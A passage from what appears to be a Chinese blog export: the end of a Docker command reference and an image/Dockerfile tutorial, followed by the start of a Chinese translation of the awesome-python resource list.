'bridge': 在docker bridge桥上创建一个新的网络栈。\n                                 'none': 该容器没有网络。\n                  'container:name|id': 重新使用其它容器的网络栈。\n                                 'host': 在该容器内使用host网络堆栈。注意：host模式对宿主机上的本地文件系统给定了容器全部的访问权限，包括D-bus，因此容器被认为是不安全的。\n\n  -P, --publish-all=false    发布所有的暴露端口到宿主机接口上。\n  -p, --publish=[]           发布容器的一个端口到宿主机接口上。\n                             格式：\nip:hostPort:containerPort\nip::containerPort\nhostPort:containerPort\ncontainerPort\n                               (使用 'docker port'查看实际的映射)\n  --privileged=false         给这个容器扩展权限。\n  --restart=\"\"               当容器退出时重启策略将会被应用，选项值有：\n(no, on-failure[:max-retry], always)\n  --security-opt=[]          安全选项。\n  -t, --tty=false            分配伪终端。\n  -u, --user=\"\"              用户名或者UID。\n  -v, --volume=[]             绑定挂载卷(例如，从宿主机挂接：-v /host:/container，从Docker挂接：-v /container)\n  --volumes-from=[]          从指定的容器挂载卷。\n  -w, --workdir=\"\"           指定容器内的工作目录。\n\ndocker save         \n\n使用方法: docker save [OPTIONS] IMAGE [IMAGE...]\n\n将镜像保存到一个归档文件(默认为STDOUT)\n\n  -o, --output=\"\"    输出到一个文件而不是STDOUT。\n\ndocker search     \n\n使用方法: docker search [OPTIONS] TERM\n\n从Docker Hub 上搜索镜像。\n\n  --automated=false    仅显示自动构建。\n  --no-trunc=false     不要截断输出。\n  -s, --stars=0        仅显示至少x 星级的镜像。\n\ndocker start           \n\n使用方法: docker start [OPTIONS] CONTAINER [CONTAINER...]\n\n重新启动一个停止的容器。\n\n  -a, --attach=false         附加容器的STDOUT 和 STDERR，并且所有的信号到进程。\n  -i, --interactive=false    附加容器的STDIN。\n\ndocker stop      \n\n使用方法: docker stop [OPTIONS] CONTAINER [CONTAINER...]\n\n通过发送SIGTERM 信号，在一个优雅的时间断后然后是SIGKILL停止运行的容器。\n\n  -t, --time=10      在杀掉容器之前等待容器停止的时间数。\n\ndocker tag      \n\n使用方法: docker tag OPTIONS] IMAGE[:TAG] [REGISTRYHOST/NAME[:TAG]\n\n标记一个进入仓库的镜像。\n\n  -f, --force=false    强制。\n\ndocker top      \n\n使用方法: docker top CONTAINER [ps OPTIONS]\n\n显示容器中运行的进程。\n\ndocker unpause              \n使用方法: docker unpause CONTAINER\n\n取消暂停容器内的所有进程。\n\ndocker version           \n\n使用方法: docker version\n\n显示Docker的版本信息。\n\ndocker wait            \n\n使用方法: docker wait CONTAINER [CONTAINER...]\n\nBlock until a container stops, then print its exit code.\n阻塞运行直到容器停止，然后打印出它的退出代码。\n\n########################################################################\ndocker 之所以这么牛逼, 一是在于他强大的生态环境, 以及,他container和writable layer 的新颖的概念.\ndocker镜像的简单剖析\n\ndocker的images,我们可以理解为积木, 一层一层往上搭, 最后完成一个工程化的大项目.\n\n在最初,docker实际上,只有一个静态的image(Ps: read-only). 相当于只能读, 所以, 你所有的改动并不会影响到原来的image上, 只会一层一层的叠加, 比如, 你在Ubuntu的image上面, 再接一层nodeJS的image. 实际上的结果是, 两个image叠加起来.\n\n这里放一张 the Docker book 的说明图:\n\n(Ps: 算啦,估计大家也没听懂,还是在下面根据实例,来进行细致的区分吧)\n\ndocker 在下载image的时候,会在 /var/lib/docker 目录下创建相关的image 目录. 而运行的container则会放在 /var/lib/docker/containers 中.\n\n另外,docker中的image,是存储在 docker仓库 . 现在,我们通过快速创建自已的仓库来仔细了解一下docker是怎样拥有这样一个完善的生态的.\ndocker 仓库\n\n首先, 要想拥有自己的docker 仓库, 你得有一个自己的docker账号.so, 那就想apply 一个呗. 在 docker hub 上面注册一下自己的账号就行.\n登录指令\n\n在docker中,不仅支持web查看docker中的内容, 而且还支持使用命令行登录.\n\n// 登录到docker\ndocker login // 然后输入账户密码就ok了\n// 使用完毕,想要登出\ndocker logout\n\n实际上,docker会将你的认证信息存放在. ~/.docker/config.json 当中。\nimages 常用命令\n\n如果浏览了上面的docker仓库, 会发现在一个repository里面会存在很多images, 比如 ubuntu的repository .不同的images发布,代表的都是特定的版本系统. 所以,在拉取的时候,需要额外注意一下你需要的指定docker images.\nimages的拉取\n\n在container中,我们讲过,使用docker run的时候, 你会发现如果你的images里面没有存在指定的image时, docker会主动去docker hub里面找,然后下载,并且自动运行.\n\n// 运行最新版的ubuntu image\ndocker run -t -i ubuntu:latest\n\n如果,你想自己手动下载images的话,可以直接 pull\n\n// 手动拉取images\ndocker pull ubuntu:latest\n// 拉取12.04版本的ubuntu images\ndocker pull ubuntu:12.04\n\n如果在拉取的时候,想知道这个image是否是真正存在的话,就可以使用.docker 提供的搜索指令.\n搜索指定docker\n\n在docker中,可以使用自带的 search 命令,搜索所有含有指定term的image. 相当于js中的search 方法.\n\n// 搜索name中含有demo的image\ndocker search demo\n// 结果为: 名字. 通常为: author/imagename . 通常搜索的就是这个\n// 描述: 就是一段文字描述\nNAME  DESCRIPTION  STARS OFFICIAL   AUTOMATED\n\n查到之后,我们就可以使用pull将指定的库,拉下来了.\n创建自己的image\n\n上面说过, contianer是copy image运行的进程容器,image是不会变的read-only 块. 但是,如果我们在container里面, 改动了一些设置,比如,下载了node, 而且,我想要保存我这次改动, 以至于,下次我想重新,启动该image时, 他已经具备了node.\n\n// 现在我再ubuntu:latest上面安装了node\n// 伪代码\nnpm install node -g\n\ndocker提供了一个非常快捷的方式就是创建自己的docker image. 使用 docker commit .\n\n// 查看刚才改动的container ID\ndocker ps -a -q -l\n// 得到 dockerid, 提交到自己的库中\ndocker commit dockerid villainHR/node\n// 之后会返回新的image id\n\n需要注意, docker commit 提交的并不是一个整体的100+MB的ubuntu+node. 他只会将两个仓库的差异提交,比如原来image和新的image比起来,就是多了一个 npm install node -g 命令.\n使用Dockerfile\n\nDockerfile是为了迅速的构建image而出现的. 他与docker commit 的区别在于. 能够迅速的更替历史image 命令. 比如,我们以前下载的npm是version 2, 现在想要更换为npm@3的话,则难度就不是一般的了. 但是,如果我们能够像写命令一样将下载的配置命令下载Dockerfile里面, 那么以后我们想要更换版本,就是很方便的啦.\n\nok, 现在我们来了解一下Dockerfile是怎样的运行的.\ndockerfile demo讲解\n\n这里,我们利用dockerfile 来搭建一个简单的webServer. 首先创建一个你自己的dockerfile目录\n\nmkdir firstdocker\ncd firstdocker\ntouch Dockerfile\n\n然后, 确保你有ubuntu:latest image.因为, 接下来我们就是基于它,来搭建我们的server.\n\nfirst dockerfile demo\nFROM ubuntu:latest\n 设置该dockerfile的作者和联系邮箱\nMAINTAINER Jimmy \"villainhr@gmail.com\"\n开始配置环境, 下载apt-get,生成index.html的文件\nRUN apt-get update \u0026\u0026 apt-get install -y nginx\nRUN echo 'first demo'   /usr/share/nginx/html/index.html\n 暴露server的port\nEXPOSE 80\n\n说一下上面的命令内涵.\n\n    FROM: 用来指定第一层image, 这是必须有的. 并且指定的image是存在在你的computer中. 相当于是 docker run.\n\n    RUN: 这是用来在container中,做出相应的修改. 相当于 修改+docker commit xxx . 给原来的image加上一层layer. 然后, docker会在你commit新一层之后,重新docker run你最新改动过的image\n\n    MAINTAINER: 设置作者和联系邮箱.其实就是docker commit 后面的Name参数. 而且加上了联系邮箱. 这是在dockerfile 运行完后,会自动添加到image上的.\n\n    EXPOSE: 用来给最新的container 设置与外部交流的port\n\n上面简单的介绍了基本的dockerfile的命令. 不过, 这尼玛太简单了,不符合我们一贯追求到底的风格.\n\n这里, 我们在来细说一下RUN这个命令. 实际上, 这应该是dockerfile的关键. RUN的原理很简单, 就是 commit + run . 先创建一个新的image 然后 在这个基础上将原有的container替换为新的,如果某一步的RUN发生错误,则container会停在那个阶段, 这样,你可以直接进入该container去查看,你那一步的RUN发生了什么BUG。 另外, 使用RUN的时候, 需要注意, 由于,dockerfile是由上到下解析的, 比如你一开始 FROM ubuntu 的image, 那么此时的环境是停留在ubuntu的shell中的.\n\n比如:\n\nRUN touch demo.js\n// 等同于\n/bin/sh -c touch demo.js\n\n所以, 如果你调用的image 并没有shell的话, 那么久需要使用exec调用系统shell 来执行命令.\n\n// 调用系统的shell来运行, 实际上就是 exec xxx xxx xxx.\nRUN [\"npm\",\"install\",\"node\"]\n\n运行dockerfile\n\n上面的dockerfile文件配置好了之后,就轮到我们运行dockerfile.直接运行 docker build 即可.\n\n// 注意后面的\".\", 用来指定搜索dockerfile文件的路径.\ndocker build -t=\"jimmy/firstdockerfile\" .\n\n说一下docker build的指令吧.\n\n// 基本格式为:\ndocker build -t=\"repository/name:tag\"  directory\n// -t用来指定生成的image的name,比如仓库,image的名字以及他的tag,如果你不指定tag, 那么docker会自动添加latest代替。\n// directory 用来相对于当前运行build的目录, 搜索指定的dockerfile.当然,你也可以使用绝对路径了\n\n顺利的话,应该就会有, 下列的信息出来.\n\nSending build context to Docker daemon 2.048 kB\nStep 1 : FROM ubuntu:latest","tags":null},{"location":"//blog.pytool.com/Post/Awesome/2016-03-29 awesome-python-cn","title":"Python 资源大全中文版","text":"Python 资源大全中文版\n\n我想很多程序员应该记得 GitHub 上有一个 Awesome - XXX 系列的资源整理。awesome-python 是 vinta 发起维护的 Python 资源列表，内容包括：Web框架、网络爬虫、网络内容提取、模板引擎、数据库、数据可视化、图片处理、文本处理、自然语言处理、机器学习、日志、代码分析等。由伯乐在线持续更新。\n\nAwesome 系列虽然挺全，但基本只对收录的资源做了极为简要的介绍，如果有更详细的中文介绍，对相应开发者的帮助会更大。这也是我们发起这个开源项目的初衷。\n\n \n\n 我们要做什么？\n\n基于 awesome-python 列表，我们将对其中的各个资源项进行编译整理。此外还将从其他来源补充好资源。\n整理后的内容，将收录在伯乐在线资源频道。可参考已整理的内容：\n  《Scrapy：Python的爬虫框架》\n  《Flask：一个使用Python编写的轻量级Web应用框架》\n\n \n\n如何参与本项目？\n\n从下面的目录来看，本项目的工作量小不了，所以非常期待能有更多程序员一起来参与。\n\n不过加入前，有几个小要求：\n\n英文还不错，能读懂英文并用自己的话复述；\n在用 Python；\n\n如有兴趣，请加 QQ：50872495。加 Q 时请注明「Python大全」\n\n \n\n 如何为列表贡献新资源？\n\n欢迎大家为列表贡献高质量的新资源，提交PR时请参照以下要求：\n\n请确保推荐的资源自己使用过\n提交PR时请注明推荐理由\n\n资源列表管理收到PR请求后，会定期（每周）在微博转发本周提交的PR列表，并在微博上面听取使用过这些资源的意见。确认通过后，会加入资源大全。\n\n感谢您的贡献！\n\n \n\n本项目的参与者\n\n维护者：\n贡献者：艾凌风、Namco、Daetalus、黄利民、atupal、rainbow、木头lbj、beyondwu、cissoid、李广胜、polyval\n\n注：名单不分排名，不定期补充更新\n\n \n\n 奖励计划\n\n虽然奖励可能并不是你加入的主要原因，但还是有必要提一下：\n\n整理超过 20 个资源后，可在伯乐在线上开通打赏；\n每整理 20 个资源，有机会获得技术书籍或各种有意思的创意、极客产品；\n奖励详情\n\n \n\n环境管理\n\n管理 Python 版本和环境的工具\n\np：非常简单的交互式 python 版本管理工具。官网\npyenv：简单的 Python 版本管理工具。官网\nVex：可以在虚拟环境中执行命令。官网\nvirtualenv：创建独立 Python 环境的工具。官网\nvirtualenvwrapper：virtualenv 的一组扩展。官网\n\n 包管理\n\n管理包和依赖的工具。\n\npip：Python 包和依赖关系管理工具。官网\npip-tools：保证 Python 包依赖关系更新的一组工具。官网\nconda：跨平台，Python 二进制包管理工具。官网\nCurdling：管理 Python 包的命令行工具。官网\nwheel：Python 分发的新标准，意在取代 eggs。官网\n\n包仓库\n\n本地 PyPI 仓库服务和代理。\n\nwarehouse：下一代 PyPI。官网\n    Warehouse：PyPA 提供的 PyPI 镜像工具。官网 bandersnatch\ndevpi：PyPI 服务和打包/测试/分发工具。官网\nlocalshop：本地 PyPI 服务（自定义包并且自动对 PyPI 镜像）。官网\n\n 分发\n\n打包为可执行文件以便分发。\n\nPyInstaller：将 Python 程序转换成独立的执行文件（跨平台）。官网\ndh-virtualenv：构建并将 virtualenv 虚拟环境作为一个 Debian 包来发布。官网\nNuitka：将脚本、模块、包编译成可执行文件或扩展模块。官网\npy2app：将 Python 脚本变为独立软件包（Mac OS X）。官网\npy2exe：将 Python 脚本变为独立软件包（Windows）。官网\npynsist：一个用来创建 Windows 安装程序的工具，可以在安装程序中打包 Python本身。官网\n\n构建工具\n\n将源码编译成软件。\n\nbuildout：一个构建系统，从多个组件来创建，组装和部署应用。官网\nBitBake：针对嵌入式 Linux 的类似 make 的构建工具。官网\nfabricate：对任何语言自动找到依赖关系的构建工具。官网\nPlatformIO：多平台命令行构建工具。官网\nPyBuilder：纯 Python 实现的持续化构建工具。官网\nSCons：软件构建工具。官网\n\n 交互式解析器\n\n交互式 Python 解析器。\n\nIPython：功能丰富的工具，非常有效的使用交互式 Python。官网\nbpython：界面丰富的 Python 解析器。官网\nptpython：高级交互式Python解析器， 构建于python-prompt-toolkit 之上。官网\n\n文件\n\n文件管理和 MIME（多用途的网际邮件扩充协议）类型检测。\n\nimghdr：（Python 标准库）检测图片类型。官网\nmimetypes：（Python 标准库）将文件名映射为 MIME 类型。官网\npath.py：对 os.path 进行封装的模块。官网\npathlib：（Python3.4+ 标准库）跨平台的、面向对象的路径操作库。官网\npython-magic：文件类型检测的第三方库 libmagic 的 Python 接口。官网\nUnipath：用面向对象的方式操作文件和目录。官网\nwatchdog：管理文件系统事件的 API 和 shell 工具官网\n\n 日期和时间\n\n操作日期和时间的类库。\n\narrow：更好的 Python 日期时间操作类库。官网\nChronyk：Python 3 的类库，用于解析手写格式的时间和日期。官网\ndateutil：Python datetime 模块的扩展。官网\ndelorean：解决 Python 中有关日期处理的棘手问题的库。官网\nmoment：一个用来处理时间和日期的Python库。灵感来自于Moment.js。官网\nPyTime：一个简单易用的Python模块，用于通过字符串来操作日期/时间。官网\npytz：现代以及历史版本的世界时区定义。将时区数据库引入Python。官网\nwhen.py：提供用户友好的函数来帮助用户进行常用的日期和时间操作。官网\n\n文本处理\n\n用于解析和操作文本的库。\n\n通用\n    chardet：字符编码检测器，兼容 Python2 和 Python3。官网\n    difflib：(Python 标准库)帮助我们进行差异化比较。官网\n    ftfy：让Unicode文本更完整更连贯。官网\n    fuzzywuzzy：模糊字符串匹配。官网\n    Levenshtein：快速计算编辑距离以及字符串的相似度。官网\n    pangu.py：在中日韩语字符和数字字母之间添加空格。官网\n    yfiglet-figlet：pyfiglet -figlet 的 Python实现。\n    shortuuid：一个生成器库，用以生成简洁的，明白的，URL 安全的 UUID。官网\n    unidecode：Unicode 文本的 ASCII 转换形式 。官网\n    uniout：打印可读的字符，而不是转义的字符串。官网\n    xpinyin：一个用于把汉字转换为拼音的库。官网\nSlug化\n    awesome-slugify：一个 Python slug 化库，可以保持 Unicode。官网\n    python-slugify：Python slug 化库，可以把 unicode 转化为 ASCII。官网\n    unicode-slugify：一个 slug 工具，可以生成 unicode slugs ,需要依赖 Django 。官网\n解析器\n    phonenumbers：解析，格式化，储存，验证电话号码。官网\n    PLY：lex 和 yacc 解析工具的 Python 实现。官网\n    Pygments：通用语法高亮工具。官网\n    pyparsing：生成通用解析器的框架。官网\n    python-nameparser：把一个人名分解为几个独立的部分。官网\n    python-user-agents：浏览器 user agent 解析器。官网\n    sqlparse：一个无验证的 SQL 解析器。官网\n\n 特殊文本格式处理\n\n一些用来解析和操作特殊文本格式的库。\n\n通用\n    tablib：一个用来处理中表格数据的模块。官网\nOffice\n    Marmir：把输入的Python 数据结构转换为电子表单。官网\n    openpyxl：一个用来读写 Excel 2010 xlsx/xlsm/xltx/xltm 文件的库。官网\n    python-docx：读取，查询以及修改 Microsoft Word 2007/2008 docx 文件。官网\n    unoconv：在 LibreOffice/OpenOffice 支持的任意文件格式之间进行转换。官网\n    XlsxWriter：一个用于创建 Excel .xlsx 文件的 Python 模块。官网\n    xlwings：一个使得在 Excel 中方便调用 Python 的库（反之亦然），基于 BSD 协议。官网\n    xlwt：读写 Excel 文件的数据和格式信息。官网 / xlrd\n    relatorio：模板化OpenDocument 文件。官网\nPDF\n    PDFMiner：一个用于从PDF文档中抽取信息的工具。官网\n    PyPDF2：一个可以分割，合并和转换 PDF 页面的库。官网\n    ReportLab：快速创建富文本 PDF 文档。官网\nMarkdown\n    Mistune：快速并且功能齐全的纯 Python 实现的 Markdown 解析器。官网\n    Python-Markdown：John Gruber’s Markdown 的 Python 版实现。官网\n    Python-Markdiwn2：纯 Python 实现的 Markdown 解析器，比 Python-Markdown 更快，更准确，可扩展。官网\nYAML\n    PyYAML：Python 版本的 YAML 解析器。官网\nCSV\n    csvkit：用于转换和操作 CSV 的工具。官网\nArchive\n    unp：一个用来方便解包归档文件的命令行工具。官网\n\n自然语言处理\n\n用来处理人类语言的库。\n\nNLTK：一个先进的平台，用以构建处理人类语言数据的 Python 程序。官网\njieba：中文分词工具。官网\nlangid.py：独立的语言识别系统。官网\nPattern：Python 网络信息挖掘模块。官网\nSnowNLP：一个用来处理中文文本的库。官网\nTextBlob：为进行普通自然语言处理任务提供一致的 API。官网\nTextGrocery：一简单高效的短文本分类工具，基于 LibLinear 和 Jieba。官网\n\n 文档\n\n用以生成项目文档的库。\n\nSphinx：Python 文档生成器。官网\n    awesome-sphinxdoc：官网\nMkDocs：对 Markdown 友好的文档生成器。官网\npdoc：一个可以替换Epydoc 的库，可以自动生成 Python 库的 API 文档。官网\nPycco：文学编程（literate-programming）风格的文档生成器。官网\n\n配置\n\n用来保存和解析配置的库。\n\nconfig：logging 模块作者写的分级配置模块。官网\nConfigObj：INI 文件解析器，带验证功能。官网\nConfigParser：(Python 标准库) INI 文件解析器。官网\nprofig：通过多种格式进行配置，具有数值转换功能。官网\npython-decouple：将设置和代码完全隔离。官网\n\n 命令行工具\n\n用于创建命令行程序的库。\n\n命令行程序开发\n    cement：Python 的命令行程序框架。官网\n    click：一个通过组合的方式来创建精美命令行界面的包。官网\n    cliff：一个用于创建命令行程序的框架，可以创建具有多层命令的命令行程序。官网\n    clint：Python 命令行程序工具。官网\n    colorama：跨平台彩色终端文本。官网\n    docopt：Python 风格的命令行参数解析器。官网\n    Gooey：一条命令，将命令行程序变成一个 GUI 程序。官网\n    python-prompt-toolkit：一个用于构建强大的交互式命令行程序的库。官网\n    Pythonpy：在命令行中直接执行任何Python指令。官网\n生产力工具\n    aws-cli：Amazon Web Services 的通用命令行界面。官网\n    bashplotlib：在终端中进行基本绘图。官网\n    caniusepython3：判断是哪个项目妨碍你你移植到 Python 3。官网\n    cookiecutter：从 cookiecutters（项目模板）创建项目的一个命令行工具。官网\n    doitlive：一个用来在终端中进行现场演示的工具。官网\n    howdoi：通过命令行获取即时的编程问题解答。官网\n    httpie：一个命令行HTTP 客户端，cURL 的替代品，易用性更好。官网\n    PathPicker：从bash输出中选出文件。官网\n    percol：向UNIX shell 传统管道概念中加入交互式选择功能。官网\n    SAWS：一个加强版的 AWS 命令行。官网\n    thefuck：修正你之前的命令行指令。官网\n    mycli：一个 MySQL 命令行客户端，具有自动补全和语法高亮功能。官网\n    pgcli：Postgres 命令行工具，具有自动补全和语法高亮功能。官网\n\n下载器\n\n用来进行下载的库.\n\ns3cmd：一个用来管理Amazon S3 和 CloudFront 的命令行工具。官网\ns4cmd：超级 S3 命令行工具，性能更加强劲。官网\nyou-get：一个 YouTube/Youku/Niconico 视频下载器，使用 Python3 编写。官网\nyoutube-dl：一个小巧的命令行程序，用来下载 YouTube 视频。官网\n\n 图像处理\n\n用来操作图像的库.\n\npillow：Pillow 是一个更加易用版的 PIL。官网\nhmap：图像直方图映射。官网\nimgSeek：一个使用视觉相似性搜索一组图片集合的项目。官网\nnude.py：裸体检测。官网\npyBarcode：不借助 PIL 库在 Python 程序中生成条形码。官网\npygram：类似 Instagram 的图像滤镜。官网\npython-qrcode：一个纯 Python 实现的二维码生成器。官网\nQuads：基于四叉树的计算机艺术。官网\nscikit-image：一个用于（科学）图像处理的 Python 库。官网\nthumbor：一个小型图像服务，具有剪裁，尺寸重设和翻转功能。官网\nwand：MagickWand的Python 绑定。MagickWand 是 ImageMagick的 C API 。官网\n\nOCR\n\n光学字符识别库。\n\npyocr：Tesseract 和 Cuneiform 的一个封装(wrapper)。官网\npytesseract：Google Tesseract OCR 的另一个封装(wrapper)。官网\npython-tesseract - Google Tesseract OCR 的一个包装类。\n\n 音频\n\n用来操作音频的库\n\naudiolazy：Python 的数字信号处理包。官网\naudioread：交叉库 (GStreamer + Core Audio + MAD + FFmpeg) 音频解码。官网\nbeets：一个音乐库管理工具及 MusicBrainz 标签添加工具官网\ndejavu：音频指纹提取和识别官网\ndjango-elastic-transcoder：Django + Amazon Elastic Transcoder。官网\neyeD3：一个用来操作音频文件的工具，具体来讲就是包含 ID3 元信息的 MP3 文件。官网\nid3reader：一个用来读取 MP3 元数据的 Python 模块。官网\nm3u8：一个用来解析 m3u8 文件的模块。官网\nmutagen：一个用来处理音频元数据的 Python 模块。官网\npydub：通过简单、简洁的高层接口来操作音频文件。官网\npyechonest：Echo Nest API 的 Python 客户端官网\ntalkbox：一个用来处理演讲/信号的 Python 库官网\nTimeSide：开源 web 音频处理框架。官网\ntinytag：一个用来读取MP3, OGG, FLAC 以及 Wave 文件音乐元数据的库。官网\nmingus：一个高级音乐理论和曲谱包，支持 MIDI 文件和回放功能。官网\n\nVideo\n\n用来操作视频和GIF的库。\n\nmoviepy：一个用来进行基于脚本的视频编辑模块，适用于多种格式，包括动图 GIFs。官网\nscikit-video：SciPy 视频处理常用程序。官网\n\n 地理位置\n\n地理编码地址以及用来处理经纬度的库。\n\nGeoDjango：世界级地理图形 web 框架。官网\nGeoIP：MaxMind GeoIP Legacy 数据库的 Python API。官网\ngeojson：GeoJSON 的 Python 绑定及工具。官网\ngeopy：Python 地址编码工具箱。官网\npygeoip：纯 Python GeoIP API。官网\ndjango-countries：一个 Django 应用程序，提供用于表格的国家选择功能，国旗图标静态文件以及模型中的国家字段。官网\n\nHTTP\n\n使用HTTP的库。\n\nrequests：人性化的HTTP请求库。官网\ngrequests：requests 库 + gevent ，用于异步 HTTP 请求.官网\nhttplib2：全面的 HTTP 客户端库。官网\ntreq：类似 requests 的Python API 构建于 Twisted HTTP 客户端之上。官网\nurllib3：一个具有线程安全连接池，支持文件 post，清晰友好的 HTTP 库。官网\n\n 数据库\n\nPython实现的数据库。\n\npickleDB：一个简单，轻量级键值储存数据库。官网\nPipelineDB：流式 SQL 数据库。官网\nTinyDB：一个微型的，面向文档型数据库。官网\nZODB：一个 Python 原生对象数据库。一个键值和对象图数据库。官网\n\n数据库驱动\n\n用来连接和操作数据库的库。\n\nySQL：awesome-mysql系列\n    mysql-python：Python 的 MySQL 数据库连接器。官网\n    ysqlclient：mysql-python 分支，支持 Python 3。\n    oursql：一个更好的 MySQL 连接器，支持原生预编译指令和 BLOBs.官网\n    PyMySQL：纯 Python MySQL 驱动，兼容 mysql-python。官网\nPostgreSQL\n    psycopg2：Python 中最流行的 PostgreSQL 适配器。官网\n    queries：psycopg2 库的封装，用来和 PostgreSQL 进行交互。官网\n    txpostgres：基于 Twisted 的异步 PostgreSQL 驱动。官网\n其他关系型数据库\n    apsw：另一个 Python SQLite封装。官网\n    dataset：在数据库中存储Python字典\n    pymssql：一个简单的Microsoft SQL Server数据库接口。官网\nNoSQL 数据库\n    cassandra-python-driver：Cassandra 的 Python 驱动。官网\n    HappyBase：一个为 Apache HBase 设计的，对开发者友好的库。官网\n    Plyvel：一个快速且功能丰富的 LevelDB 的 Python 接口。官网\n    py2neo：Neo4j restful 接口的Python 封装客户端。官网\n    pycassa：Cassandra 的 Python Thrift 驱动。官网\n    PyMongo：MongoDB 的官方 Python 客户端。官网\n    redis-py：Redis 的 Python 客户端。官网\n    telephus：基于 Twisted 的 Cassandra 客户端。官网\n    txRedis：基于 Twisted 的 Redis 客户端。官网\n\n ORM\n\n实现对象关系映射或数据映射技术的库。\n\n关系型数据库\n    Django Models：Django 的一部分。官网\n    SQLAlchemy：Python SQL 工具以及对象关系映射工具。官网\n        awesome-sqlalchemy系列\n    Peewee：一个小巧，富有表达力的 ORM。官网\n    PonyORM：提供面向生成器的 SQL 接口的 ORM。官网\n    python-sql：编写 Python 风格的 SQL 查询。官网\nNoSQL 数据库\n    django-mongodb-engine：Django MongoDB 后端。官网\n    PynamoDB：Amazon DynamoDB 的一个 Python 风格接口。官网\n    flywheel：Amazon DynamoDB 的对象映射工具。官网\n    MongoEngine：一个Python 对象文档映射工具，用于 MongoDB。官网\n    hot-redis：为 Redis 提供 Python 丰富的数据类型。官网\n    redisco：一个 Python 库，提供可以持续存在在 Redis 中的简单模型和容器。官网\n其他\n    butterdb：Google Drive 电子表格的 Python ORM。官网\n\nWeb 框架\n\n全栈 Web 框架。\n\nDjango：Python 界最流行的 web 框架。官网\n    awesome-django系列\nFlask：一个 Python 微型框架。官网\n    awesome-flask系列\npyramid：一个小巧，快速，接地气的开源Python web 框架。\n    awesome-pyramid系列\nBottle：一个快速小巧，轻量级的 WSGI 微型 web 框架。官网\nCherryPy：一个极简的 Python web 框架，服从 HTTP/1.1 协议且具有WSGI 线程池。官网\nTurboGears：一个可以扩展为全栈解决方案的微型框架。官网\nweb.py：一个 Python 的 web 框架，既简单，又强大。官网\nweb2py：一个全栈 web 框架和平台，专注于简单易用。官网\nTornado：一个web 框架和异步网络库。官网\n\n 权限\n\n允许或拒绝用户访问数据或功能的库。\n\nCarteblanche：Module to align code with thoughts of users and designers. Also magically handles navigation and permissions.官网\ndjango-guardian：Django 1.2+ 实现了单个对象权限。官网\ndjango-rules：一个小巧但是强大的应用，提供对象级别的权限管理，且不需要使用数据库。官网\n\nCMS\n\n内容管理系统\n\nodoo-cms: 一个开源的，企业级 CMS，基于odoo。官网\ndjango-cms：一个开源的，企业级 CMS，基于 Django。官网\ndjedi-cms：一个轻量级但却非常强大的 Django CMS ，考虑到了插件，内联编辑以及性能。官网\nFeinCMS：基于 Django 构建的最先进的内容管理系统之一。官网\nKotti：一个高级的，Python 范的 web 应用框架，基于 Pyramid 构建。官网\nMezzanine：一个强大的，持续的，灵活的内容管理平台。官网\nOpps：一个为杂志，报纸网站以及大流量门户网站设计的 CMS 平台，基于 Django。官网\nPlone：一个构建于开源应用服务器 Zope 之上的 CMS。官网\nQuokka：灵活，可扩展的小型 CMS，基于 Flask 和 MongoDB。官网\nWagtail：一个 Django 内容管理系统。官网\nWidgy：最新的 CMS 框架，基于 Django。官网\n\n 电子商务\n\n用于电子商务以及支付的框架和库。\n\ndjango-oscar：一个用于 Django 的开源的电子商务框架。官网\ndjango-shop：一个基于 Django 的店铺系统。官网\nCartridge：一个基于 Mezzanine 构建的购物车应用。官网\nshoop：一个基于 Django 的开源电子商务平台。官网\nalipay：非官方的 Python 支付宝 API。官网\nmerchant：一个可以接收来自多种支付平台支付的 Django 应用。官网\nmoney：货币类库with optional CLDR-backed locale-aware formatting and an extensible currency exchange solution.官网\npython-currencies：显示货币格式以及它的数值。官网\n\nRESTful API\n\n用来开发RESTful APIs的库\n\nDjango\n    django-rest-framework：一个强大灵活的工具，用来构建 web API。官网\n    django-tastypie：为Django 应用开发API。官网\n    django-formapi：为 Django 的表单验证，创建 JSON APIs 。官网\nFlask\n    flask-api：为 flask 开发的，可浏览 Web APIs 。官网\n    flask-restful：为 flask 快速创建REST APIs 。官网\n    flask-restless：为 SQLAlchemy 定义的数据库模型创建 RESTful APIs 。官网\n    flask-api-utils：为 Flask 处理 API 表示和验证。官网\n    eve：REST API 框架，由 Flask, MongoDB 等驱动。官网\nPyramid\n    cornice：一个Pyramid 的 REST 框架 。官网\n与框架无关的\n    falcon：一个用来建立云 API 和 web app 后端的噶性能框架。官网\n    sandman：为现存的数据库驱动系统自动创建 REST APIs 。官网\n    restless：框架无关的 REST 框架 ，基于从 Tastypie 学到的知识。官网\n    ripozo：快速创建 REST/HATEOAS/Hypermedia APIs。官网\n\n 验证\n\n实现验证方案的库。\n\nOAuth\n    Authomatic：简单但是强大的框架，身份验证/授权客户端。官网\n    django-allauth：Django 的验证应用。官网\n    django-oauth-toolkit：为 Django 用户准备的 OAuth2。官网\n    django-oauth2-provider：为 Django 应用提供 OAuth2 接入。官网\n    Flask-OAuthlib：OAuth 1.0/a, 2.0 客户端实现，供 Flask 使用。官网\n    OAuthLib：一个 OAuth 请求-签名逻辑通用、 完整的实现。官网\n    python-oauth2：一个完全测试的抽象接口。用来创建 OAuth 客户端和服务端。官网\n    python-social-auth：一个设置简单的社会化验证方式。官网\n    rauth：OAuth 1.0/a, 2.0, 和 Ofly 的 Python 库。官网\n    sanction：一个超级简单的OAuth2 客户端实现。官网\n其他\n    jose：JavaScript 对象签名和加密草案的实现。官网\n    PyJWT：JSON Web 令牌草案 01。官网\n    python-jws：JSON Web 签名草案 02 的实现。官网\n    python-jwt：一个用来生成和验证 JSON Web 令牌的模块。官网\n\n模板引擎\n\n模板生成和词法解析的库和工具。\n\nJinja2：一个现代的，对设计师友好的模板引擎。官网\nChameleon：一个 HTML/XML 模板引擎。 模仿了 ZPT（Zope Page Templates）, 进行了速度上的优化。官网\nGenshi：Python 模板工具，用以生成 web 感知的结果。官网\nMako：Python 平台的超高速轻量级模板。官网\n\n Queue\n\n处理事件以及任务队列的库。\n\ncelery：一个异步任务队列/作业队列，基于分布式消息传递。官网\nhuey：小型多线程任务队列。官网\nmrq：Mr. Queue -一个 Python 的分布式 worker 任务队列， 使用 Redis 和 gevent。官网\nrq：简单的 Python 作业队列。官网\nsimpleq：一个简单的，可无限扩张的，基于亚马逊 SQS 的队列。官网\n\n搜索\n\n对数据进行索引和执行搜索查询的库和软件。\n\ndjango-haystack：Django 模块化搜索。官网\nelasticsearch-py：Elasticsearch 的官方底层 Python 客户端。官网\nelasticsearch-dsl-py：Elasticsearch 的官方高级 Python 客户端。官网\nsolrpy：solr的 Python 客户端。官网\nWhoosh：一个快速的纯 Python 